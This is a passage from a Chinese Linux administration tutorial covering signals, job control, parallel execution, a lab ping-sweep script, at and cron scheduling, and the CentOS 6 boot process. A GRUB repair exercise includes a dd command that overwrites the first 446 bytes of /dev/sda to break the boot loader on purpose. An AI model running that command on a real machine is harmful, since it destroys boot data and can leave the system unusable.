SIGRTMAX-1154) SIGRTMAX-1055) SIGRTMAX-956) SIGRTMAX-857) SIGRTMAX-7<br>58) SIGRTMAX-659) SIGRTMAX-560) SIGRTMAX-461) SIGRTMAX-362) SIGRTMAX-2<br>63) SIGRTMAX-164) SIGRTMAX <br><br>[root@rocky01 ~]<span class="hljs-comment"># trap -l</span><br></code></pre></td></tr></table></figure><blockquote><p>常用信号</p><ul><li><ol><li>SIGHUP 无须关闭进程而让其重读配置文件</li></ol></li><li><ol start="2"><li>SIGINT 中止正在运行的进程；相当于Ctrl+c</li></ol></li><li><ol start="3"><li>SIGQUIT 相当于ctrl+\</li></ol></li><li><ol start="9"><li>SIGKILL 强制杀死正在运行的进程,可能会导致数据丢失,慎用!</li></ol></li><li><ol start="15"><li>SIGTERM 终止正在运行的进程，默认信号</li></ol></li><li><ol start="18"><li>SIGCONT 继续运行</li></ol></li><li><ol start="19"><li>SIGSTOP 后台休眠</li></ol></li></ul></blockquote><h4 id="2-21-2-killall"><a href="#2-21-2-killall" class="headerlink" title="2.21.2 killall"></a>2.21.2 killall</h4><p>killall命令用于杀死指定名字的进程</p><h4 id="2-21-3-pkill"><a href="#2-21-3-pkill" class="headerlink" title="2.21.3 pkill"></a>2.21.3 pkill</h4><p>pkill命令可按模式杀死进程</p><h4 id="范例：利用-0-信号实现进程的健康性检查"><a href="#范例：利用-0-信号实现进程的健康性检查" class="headerlink" title="范例：利用 0 信号实现进程的健康性检查"></a>范例：利用 0 信号实现进程的健康性检查</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#如果信号为0，则不发送实际信号，但仍执行错误检查</span><br>[root@centos8 ~]<span class="hljs-comment">#man kill</span><br>If signal is 0, <span class="hljs-keyword">then</span> no actual signal is sent, but error checking is still performed.<br><br>[root@centos8 ~]<span class="hljs-comment">#killall -0 ping</span><br>[root@centos8 ~]<span class="hljs-comment">#echo $?</span><br>0<br>[root@centos8 ~]<span class="hljs-comment">#killall -0 ping</span><br>ping: no process found<br>[root@centos8 ~]<span class="hljs-comment">#echo $?</span><br>1<br><br><span class="hljs-comment">#此方式有局限性，即使进程处于停止或僵尸状态，此方式仍然认为是进程是健康的</span><br></code></pre></td></tr></table></figure><h3 id="2-22-cockpit-CentOS8新特性"><a href="#2-22-cockpit-CentOS8新特性" class="headerlink" title="2.22 cockpit CentOS8新特性"></a>2.22 cockpit CentOS8新特性</h3><p>由cockpit包提供,当前Ubuntu和CentOS7也支持此工具</p><blockquote><p>Cockpit 是CentOS 8 取入的新特性，是一个基于 Web 界面的应用，它提供了对系统的图形化管理</p><ul><li>监控系统活动（CPU、内存、磁盘 IO 和网络流量）</li><li>查看系统日志条目</li><li>查看磁盘分区的容量</li><li>查看网络活动（发送和接收）</li><li>查看用户帐户</li><li>检查系统服务的状态</li><li>提取已安装应用的信息</li><li>查看和安装可用更新（如果以 root 身份登录）并在需要时重新启动系统</li><li>打开并使用终端窗口</li></ul></blockquote><h3 id="2-23-作业管理"><a href="#2-23-作业管理" class="headerlink" title="2.23 作业管理"></a>2.23 作业管理</h3><blockquote><p>Linux的作业控制</p><p>前台作业：通过终端启动，且启动后一直占据终端</p><p>后台作业：可通过终端启动，但启动后即转入后台运行（释放终端）</p></blockquote><p><a href="https://img2022.cnblogs.com/blog/2927659/202209/2927659-20220903173329135-1799538779.png"><img src="2927659-20220903173329135-1799538779.png" alt="img"></a></p><h4 id="2-23-1让作业运行于后台"><a href="#2-23-1让作业运行于后台" class="headerlink" title="2.23.1让作业运行于后台"></a>2.23.1让作业运行于后台</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">运行中的作业： Ctrl+z<br>尚未启动的作业： COMMAND &amp;<br></code></pre></td></tr></table></figure><p>后台作业虽然被送往后台运行，但其依然与终端相关；</p><p>退出终端，将关闭后台作业。如果希望送往后台后，剥离与终端的关系</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># nohup COMMAND &amp;&gt;/dev/null &amp; </span><br>[root@rocky01 ~]<span class="hljs-comment"># screen；COMMAND</span><br>[root@rocky01 ~]<span class="hljs-comment"># tmux；COMMAND</span><br></code></pre></td></tr></table></figure><h4 id="2-23-2-查看当前终端所有作业"><a href="#2-23-2-查看当前终端所有作业" class="headerlink" title="2.23.2 查看当前终端所有作业"></a>2.23.2 查看当前终端所有作业</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># jobs</span><br></code></pre></td></tr></table></figure><h4 id="2-23-3-作业控制"><a href="#2-23-3-作业控制" class="headerlink" title="2.23.3 作业控制"></a>2.23.3 作业控制</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">fg</span> [[%]JOB_NUM]：把指定的后台作业调回前台<br><span class="hljs-built_in">bg</span> [[%]JOB_NUM]：让送往后台的作业在后台继续运行<br><span class="hljs-built_in">kill</span> [%JOB_NUM]： 终止指定的作业<br></code></pre></td></tr></table></figure><h4 id="范例：nohup"><a href="#范例：nohup" class="headerlink" title="范例：nohup"></a>范例：nohup</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># nohup ping 127.0.0.1 &amp;&gt; /dev/null &amp;</span><br>[1] 20691<br>[root@rocky01 ~]<span class="hljs-comment"># pstree -p |grep ping</span><br>           |-sshd(942)-+-sshd(19392)---sshd(19394)---bash(19395)---ping(20691)<br><br><span class="hljs-comment">#关闭对应的终端,再观察进程的父进程</span><br>[root@rocky01 ~]<span class="hljs-comment"># pstree -p |grep ping</span><br>           |-ping(20691)<br></code></pre></td></tr></table></figure><h3 id="2-24-并行运行"><a href="#2-24-并行运行" class="headerlink" title="2.24 并行运行"></a>2.24 并行运行</h3><p>利用后台执行，实现并行功能，即同时运行多个进程，提高效率</p><p>后台执行的程序，要想退出，要个wait指令，否则，它什么时候退出，敲回车才能看出来</p><h4 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># cat all.sh</span><br>/root/f1.sh&amp;<br>/root/f2.sh&amp;<br>/root/f3.sh&amp;<br><span class="hljs-built_in">wait</span><br></code></pre></td></tr></table></figure><h4 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">(/root/f1.sh&amp;);(/root/f2.sh&amp;);(/root/f3.sh&amp;)<br></code></pre></td></tr></table></figure><h4 id="方法3"><a href="#方法3" class="headerlink" title="方法3"></a>方法3</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># /root/f1.sh&amp;/root/f2.sh&amp;/root/f3.sh&amp;wait</span><br></code></pre></td></tr></table></figure><h4 id="范例：多组命令实现并行"><a href="#范例：多组命令实现并行" class="headerlink" title="范例：多组命令实现并行"></a>范例：多组命令实现并行</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># &#123; ping -c3 127.1; ping 127.2; &#125;&amp; &#123; ping -c3 127.3 ;ping 127.4; &#125;&amp;</span><br></code></pre></td></tr></table></figure><h4 id="范例：扫描主机"><a href="#范例：扫描主机" class="headerlink" title="范例：扫描主机"></a>范例：扫描主机</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@centos8 ~]<span class="hljs-comment">#cat scan_host.sh</span><br><span class="hljs-comment">#!/bin/bash</span><br><br><span class="hljs-comment">#******************************************************</span><br><span class="hljs-comment"># Author:          会不会有那么一天</span><br><span class="hljs-comment"># E-mail:          willoneday@qq.com</span><br><span class="hljs-comment"># Date:            2022-09-04</span><br><span class="hljs-comment"># FileName:        2.sh</span><br><span class="hljs-comment"># Version:         1.0.0</span><br><span class="hljs-comment"># Description:     The test script</span><br><span class="hljs-comment"># BLOG:            https://www.cnblogs.com/Willoneday</span><br><span class="hljs-comment">#******************************************************</span><br><br>net=10.0.0<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> &#123;1..254&#125;;<span class="hljs-keyword">do</span><br>   &#123; <br>    <span class="hljs-keyword">if</span> ping -c1 -W1 <span class="hljs-variable">$net</span>.<span class="hljs-variable">$i</span> &amp;&gt; /dev/null;<span class="hljs-keyword">then</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-variable">$net</span>.<span class="hljs-variable">$i</span> is up<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-variable">$net</span>.<span class="hljs-variable">$i</span> is down<br>    <span class="hljs-keyword">fi</span><br>   &#125;&amp;<br><span class="hljs-keyword">done</span><br><span class="hljs-built_in">wait</span><br><br>[root@rocky01 ~]<span class="hljs-comment"># bash scanhost.sh</span><br>10.0.0.7 is up<br>10.0.0.1 is up<br>10.0.0.2 is up<br>10.0.0.6 is up<br>10.0.0.8 is up<br>10.0.0.3 is down<br>10.0.0.5 is down<br>10.0.0.29 is down<br>10.0.0.14 is down<br>10.0.0.15 is down<br>10.0.0.10 is down<br>10.0.0.23 is down<br>10.0.0.12 is down<br>......<br>10.0.0.245 is down<br>10.0.0.246 is down<br>10.0.0.240 is down<br>[root@rocky01 ~]<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><hr><h2 id="3-任务计划"><a href="#3-任务计划" class="headerlink" title="3 任务计划"></a>3 任务计划</h2><p><strong>通过任务计划，可以让系统自动的按时间或周期性任务执行任务</strong></p><p>注意: 此功能需要实现邮件通知，必须安装并启动邮件服务</p><p>范例: 环境准备</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># yum -y install postfix</span><br>[root@rocky01 ~]<span class="hljs-comment"># systemctl enable --now postfix</span><br></code></pre></td></tr></table></figure><blockquote><p>未来的某时间点执行一次任务</p><ul><li>at 指定时间点，执行一次性任务</li><li>batch 系统自行选择空闲时间去执行此处指定的任务</li></ul><p>周期性运行某任务</p><ul><li>cron</li></ul></blockquote><h3 id="3-1-一次性任务"><a href="#3-1-一次性任务" class="headerlink" title="3.1 一次性任务"></a>3.1 一次性任务</h3><h4 id="3-1-1-at-工具"><a href="#3-1-1-at-工具" class="headerlink" title="3.1.1 at 工具"></a>3.1.1 at 工具</h4><p>由包 at 提供</p><blockquote><ul><li>依赖与atd服务,需要启动才能实现at任务</li><li>at队列存放在/var/spool/at目录中,ubuntu存放在/var/spool/cron/atjobs目录下</li><li>执行任务时PATH变量的值和当前定义任务的用户身份一致</li></ul></blockquote><p>格式：<code>at [option] TIME</code></p><p>常用选项：</p><ul><li>-V 显示版本信息</li><li>-t time  时间格式 [[CC]YY]MMDDhhmm[.ss]</li><li>-l 列出指定队列中等待运行的作业；相当于atq</li><li>-d N 删除指定的N号作业；相当于atrm</li><li>-c N 查看具体作业N号任务</li><li>-f file 指定的文件中读取任务</li><li>-m 当任务被完成之后，将给用户发送邮件，即使没有标准输出</li></ul><p>注意：</p><p>作业执行命令的结果中的标准输出和错误以执行任务的用户身份发邮件通知给 root</p><p>默认CentOS 8 最小化安装没有安装邮件服务,需要自行安装</p><p>TIME：定义出什么时候进行 at 这项任务的时间</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">HH:MM [YYYY-mm-dd]<br>noon, midnight, teatime（4pm）,tomorrow<br>now+<span class="hljs-comment">#&#123;minutes,hours,days, OR weeks&#125;</span><br></code></pre></td></tr></table></figure><h5 id="范例：at-时间格式"><a href="#范例：at-时间格式" class="headerlink" title="范例：at 时间格式"></a>范例：at 时间格式</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#规定在某年某月的某一天的特殊时刻进行该项任务</span><br>HH:MM YYYY-MM-DD   <br>02:00 1949-10-01   <br><br>HH:MM[am|pm] [Month] [Date]<br>06pm March 17<br>17:20 tomorrow<br><br><span class="hljs-comment">#在某个时间点再加几个时间后才进行该项任务</span><br>HH:MM[am|pm] + number [minutes|hours|days|weeks]<br>now + 5 min <br>02pm + 3 days<br></code></pre></td></tr></table></figure><blockquote><p>at 任务执行方式：</p><ul><li>交互式</li><li>输入重定向</li><li>at -f file</li></ul><p>/etc/at.{allow,deny} 控制用户是否能执行at任务</p><ul><li>白名单：/etc/at.allow 默认不存在，只有该文件中的用户才能执行at命令</li><li>黑名单：/etc/at.deny 默认存在，拒绝该文件中用户执行at命令，而没有在at.deny 文件中的使用者则可执行</li><li>如果两个文件都不存在，只有 root 可以执行 at 命令</li></ul></blockquote><h3 id="3-2-cron-周期性任务计划"><a href="#3-2-cron-周期性任务计划" class="headerlink" title="3.2 cron 周期性任务计划"></a>3.2 cron 周期性任务计划</h3><p>周期性任务计划cron相关的程序包：</p><ul><li>cronie：主程序包，提供crond守护进程及相关辅助工具</li><li>crontabs：包含CentOS提供系统维护任务</li><li>cronie-anacron：cronie的补充程序，用于监控cronie任务执行状况，如:cronie中的任务在过去该运行的时间点未能正常运行，则anacron会随后启动一次此任务</li></ul><p>cron 依赖于crond服务，确保crond守护处于运行状态</p><p>cron任务分为：</p><ul><li>系统cron任务：系统维护作业，/etc/crontab 主配置文件， /etc/cron.d/ 子配置文件</li><li>用户cron任务：<ul><li><strong>红帽系统保存在 /var/spool/cron/USERNAME</strong></li><li>Ubuntu 系统存放在/var/spool/cron/crontabs/USERNAME，利用 crontab 命令管理</li></ul></li></ul><p>计划任务日志：/var/log/cron</p><h4 id="3-2-1-系统cron计划任务"><a href="#3-2-1-系统cron计划任务" class="headerlink" title="3.2.1 系统cron计划任务"></a>3.2.1 系统cron计划任务</h4><p>/etc/crontab 格式说明，详情参见 man 5 crontab</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># cat /etc/crontab</span><br>SHELL=/bin/bash                      <span class="hljs-comment">#默认的SHELL类型</span><br>PATH=/sbin:/bin:/usr/sbin:/usr/bin   <span class="hljs-comment">#默认的PATH变量值,可修改为其它路径</span><br>MAILTO=root                          <span class="hljs-comment">#默认标准输出和错误发邮件给root,可以指向其它用户</span><br><br><span class="hljs-comment"># For details see man 4 crontabs</span><br><br><span class="hljs-comment"># Example of job definition:</span><br><span class="hljs-comment"># .---------------- minute (0 - 59)</span><br><span class="hljs-comment"># |  .------------- hour (0 - 23)</span><br><span class="hljs-comment"># |  |  .---------- day of month (1 - 31)</span><br><span class="hljs-comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span><br><span class="hljs-comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class="hljs-comment"># |  |  |  |  |</span><br><span class="hljs-comment"># *  *  *  *  * user-name  command to be executed</span><br><span class="hljs-comment"># 分 时 天 月 周 用户 命令</span><br><br>                     <br></code></pre></td></tr></table></figure><h5 id="范例：使用方法-4"><a href="#范例：使用方法-4" class="headerlink" title="范例：使用方法"></a>范例：使用方法</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#晚上9点10分运行echo命令,输出信息仍会发送到root 邮箱</span><br>10 21 * * * zhangsan /bin/echo <span class="hljs-string">&quot;Howdy!&quot;</span><br><br><span class="hljs-comment">#每3小时echo和wall命令</span><br>0 */3 * * * zhangsan /bin/echo “howdy”;wall “Willoneday!”<br></code></pre></td></tr></table></figure><h5 id="crond任务相关文件"><a href="#crond任务相关文件" class="headerlink" title="crond任务相关文件"></a>crond任务相关文件</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">/etc/crontab 配置文件<br>/etc/cron.d/ 配置文件<br>/etc/cron.hourly/ 脚本<br>/etc/cron.daily/ 脚本<br>/etc/cron.weekly/ 脚本<br>/etc/cron.monthly/ 脚本<br></code></pre></td></tr></table></figure><h4 id="3-2-2-用户计划任务"><a href="#3-2-2-用户计划任务" class="headerlink" title="3.2.2 用户计划任务"></a>3.2.2 用户计划任务</h4><p>crontab命令</p><ul><li>每个用户都有专用的cron任务文件：/var/spool/cron/USERNAME</li><li>默认标准输出和错误会被发邮件给对应的用户,如：root创建的任务就发送至root的邮箱</li><li>root能够修改其它用户的作业</li><li><strong>用户的cron 中默认 PATH=/usr/bin:/bin,如果使用其它路径,在任务文件的第一行加PATH=/path或者加入到计划任务执行的脚本中</strong></li><li>第六个字段指定要运行的命令。 该行的整个命令部分，直至换行符或“％”字符，指定的shell执行.除非使用反斜杠（\）进行转义，否则该命令中的“％”字符将变为换行符，并且第一个％之后的所有数据将作为标准输入发送到该命令。</li></ul><p> crontab命令格式：</p><p> <code>crontab [-u user] [-l | -r | -e] [-i]</code></p><p> 常用选项：</p><ul><li>-l 列出所有任务</li><li>-e 编辑任务</li><li>-r 移除所有任务</li><li>-i 同-r一同使用，以交互式模式移除指定任务</li><li>-u user 指定用户管理cron任务,仅root可运行</li></ul><p>控制用户执行计划任务：</p><ul><li>/etc/cron.{allow,deny}</li></ul><h5 id="范例：Ubuntu修改默认文本编辑器为vim"><a href="#范例：Ubuntu修改默认文本编辑器为vim" class="headerlink" title="范例：Ubuntu修改默认文本编辑器为vim"></a>范例：Ubuntu修改默认文本编辑器为vim</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu01 ~]<span class="hljs-comment"># cat /etc/profile.d/env.sh</span><br><span class="hljs-built_in">export</span> EDITOR=vim<br>[root@ubuntu01 ~]<span class="hljs-comment"># source /etc/profile.d/env.sh</span><br></code></pre></td></tr></table></figure><h5 id="范例：PATH变量"><a href="#范例：PATH变量" class="headerlink" title="范例：PATH变量"></a>范例：PATH变量</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#方法1：在计划任务配置中指定PATH</span><br>[root@rocky01 ~]<span class="hljs-comment"># crontab -l</span><br>PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin<br>* * * * * useradd hehe;<span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br><br><span class="hljs-comment">#方法2：在脚本中指定PATH变量</span><br>[root@rocky01 ~]<span class="hljs-comment"># crontab -l</span><br>* * * * * /data/test.sh<br>[root@rocky01 ~]<span class="hljs-comment"># cat /data/test.sh</span><br><span class="hljs-comment">#!/bin/bash</span><br>PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin<br>useradd hehe<br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br></code></pre></td></tr></table></figure><h5 id="面试题：11月每天的6-12点之间每隔2小时执行-app-bin-test-sh"><a href="#面试题：11月每天的6-12点之间每隔2小时执行-app-bin-test-sh" class="headerlink" title="面试题：11月每天的6-12点之间每隔2小时执行/app/bin/test.sh"></a>面试题：11月每天的6-12点之间每隔2小时执行/app/bin/test.sh</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># crontab -l</span><br>0 6-12/2 * 11 * /app/bin/test.sh<br></code></pre></td></tr></table></figure><h5 id="注意：运行结果的标准输出和错误以邮件通知给相关用户"><a href="#注意：运行结果的标准输出和错误以邮件通知给相关用户" class="headerlink" title="注意：运行结果的标准输出和错误以邮件通知给相关用户"></a>注意：运行结果的标准输出和错误以邮件通知给相关用户</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">(1) COMMAND &gt; /dev/null <br>(2) COMMAND &amp;&gt; /dev/null<br></code></pre></td></tr></table></figure><p>cron任务中不建议使用%，它有特殊用途，它表示换行的特殊意义，且第一个%后的所有字符串会被将成当作命令的标准输入,如果在命令中要使用%，则需要用 \ 转义</p><p>注意：将%放置于单引号中是不支持的</p><h5 id="范例：-在crontab中-的用法"><a href="#范例：-在crontab中-的用法" class="headerlink" title="范例： 在crontab中%的用法"></a>范例： 在crontab中%的用法</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">30 2 * * * /bin/cp -a /etc/ /data/etc`<span class="hljs-built_in">date</span> +\%F_\%T`<br>30 2 * * * /bin/cp -a /etc/ /data/etc`<span class="hljs-built_in">date</span> +‘%F_%T’` <span class="hljs-comment">#有问题</span><br></code></pre></td></tr></table></figure><h5 id="范例：秒级别运行任务"><a href="#范例：秒级别运行任务" class="headerlink" title="范例：秒级别运行任务"></a>范例：秒级别运行任务</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> min <span class="hljs-keyword">in</span> 0 1 2; <span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;hi&quot;</span>; <span class="hljs-built_in">sleep</span> 20; <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><hr><h1 id="二、系统启动和内核管理"><a href="#二、系统启动和内核管理" class="headerlink" title="二、系统启动和内核管理"></a>二、系统启动和内核管理</h1><h2 id="1-CentOS-6-的启动管理"><a href="#1-CentOS-6-的启动管理" class="headerlink" title="1 CentOS 6 的启动管理"></a>1 CentOS 6 的启动管理</h2><h3 id="1-1-CentOS-6-启动流程"><a href="#1-1-CentOS-6-启动流程" class="headerlink" title="1.1 CentOS 6 启动流程"></a>1.1 CentOS 6 启动流程</h3><p><a href="https://img2022.cnblogs.com/blog/2927659/202209/2927659-20220924142611328-542291317.png"><img src="2927659-20220924142611328-542291317.png" alt="img"></a></p><blockquote><ol><li>加载BIOS的硬件信息，获取第一个启动设备</li><li>读取第一个启动设备MBR的引导加载程序(grub)的启动信息</li><li>加载核心操作系统的核心信息，核心开始解压缩，并尝试驱动所有的硬件设备</li><li>核心执行init程序，并获取默认的运行信息</li><li>init程序执行/etc/rc.d/rc.sysinit文件，重新挂载根文件系统</li><li>启动核心的外挂模块</li><li>init执行运行的各个批处理文件(scripts)</li><li>init执行/etc/rc.d/rc.local</li><li>执行/bin/login程序，等待用户登录</li><li>登录之后开始以Shell控制主机</li></ol></blockquote><h4 id="（1）硬件启动-POST"><a href="#（1）硬件启动-POST" class="headerlink" title="（1）硬件启动 POST"></a>（1）硬件启动 POST</h4><blockquote><p>POST：Power-On-Self-Test，加电自检，是BIOS功能的一个主要部分。负责完成对CPU、主板、内存、硬盘子系统、显示子系统、串并行接口、键盘等硬件情况的检测</p><p>主板的ROM：BIOS，Basic Input and Output System，保存着有关计算机系统最重要的基本输入输出程序，系统信息设置、开机加电自检程序和系统启动自举程序等</p><p>主板的RAM：CMOS互补金属氧化物半导体，保存各项参数的设定，按次序查找引导设备，第一个有引导程序的设备为本次启动设备</p></blockquote><h4 id="（2）启动加载器-bootloader"><a href="#（2）启动加载器-bootloader" class="headerlink" title="（2）启动加载器 bootloader"></a>（2）启动加载器 bootloader</h4><h5 id="（2-1）grub-功能和组成"><a href="#（2-1）grub-功能和组成" class="headerlink" title="（2.1）grub 功能和组成"></a>（2.1）grub 功能和组成</h5><blockquote><p>bootloader: 引导加载器，引导程序</p><ul><li>Windows: ntloader，仅是启动OS</li><li>Linux：功能丰富，提供菜单，允许用户选择要启动系统或不同的内核版本；把用户选定的内核装载到内存中的特定空间中，解压、展开，并把系统控制权移交给内核</li></ul></blockquote><blockquote><p>Linux的bootloader</p><ul><li>LILO：LInux LOader，早期的bootloader，功能单一</li><li>GRUB: GRand Unified Bootloader, CentOS 5,6 GRUB 0.97: GRUB Legacy， CentOS 7 以后使用GRUB 2.02</li></ul><p><strong>GRUB 启动阶段</strong></p><p><strong>primary boot loader :</strong></p><ul><li><strong>1st stage：MBR的前446个字节</strong></li><li><strong>1.5 stage：MBR 之后的扇区，让stage1中的bootloader能识别stage2所在的分区上的文件系统</strong></li></ul><p><strong>secondary boot loader ：</strong></p><ul><li><strong>2nd stage，分区文件/boot/grub/</strong></li></ul></blockquote><h5 id="（2-2）CentOS6-grub安装"><a href="#（2-2）CentOS6-grub安装" class="headerlink" title="（2.2）CentOS6 grub安装"></a>（2.2）CentOS6 grub安装</h5><p>安装 grub的两种方法：</p><p><strong>（1）grub-install 安装grub stage1和stage1_5到/dev/DISK磁盘上，并复制GRUB相关文件到 DIR/boot目录下</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">grub-install  /dev/DISK<br></code></pre></td></tr></table></figure><p>（2）grub命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#grub</span><br>grub&gt; root (hd<span class="hljs-comment">#,#)</span><br>grub&gt; setup (hd<span class="hljs-comment">#)</span><br></code></pre></td></tr></table></figure><h5 id="实战范例：grub的第1阶段故障无法启动-进行修复"><a href="#实战范例：grub的第1阶段故障无法启动-进行修复" class="headerlink" title="实战范例：grub的第1阶段故障无法启动,进行修复"></a>实战范例：grub的第1阶段故障无法启动,进行修复</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#模拟破坏grub第1阶段</span><br>[root@centos6 grub]<span class="hljs-comment">#dd if=/dev/zero of=/dev/sda bs=1 count=446</span><br><br><span class="hljs-comment">#光盘启动，进入rescue模式</span><br><span class="hljs-comment">#chroot 